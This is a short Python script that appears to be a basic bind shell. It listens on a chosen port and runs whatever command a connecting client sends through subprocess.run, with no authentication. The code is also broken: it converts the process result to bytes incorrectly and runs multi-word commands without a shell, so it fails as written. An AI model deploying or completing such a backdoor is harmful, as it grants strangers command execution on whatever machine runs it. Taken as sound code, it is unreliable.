import socket, subprocess

def connect_to_socket(target_ip, target_port):
    tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_server.bind((target_ip, target_port))
    tcp_server.listen(5)

    print(f"Listening on {socket.gethostname()} : {target_port}")

    while True:
        client_socket, client_address = tcp_server.accept()
        
        print(f"Connection from {client_address} has been Established")

        client_socket.send(bytes("Connection Established", "utf-8"))

        recieved_data = client_socket.recv(4096)
        client_socket.send(bytes(subprocess.run(recieved_data.decode("utf-8")), "utf-8"))

def main():
    my_target = input("target")
    my_target_port = input("target_port")
    
    try: connect_to_socket(my_target, int(my_target_port))
    except Exception as ex: print(ex)

if __name__ == "__main__": main()    

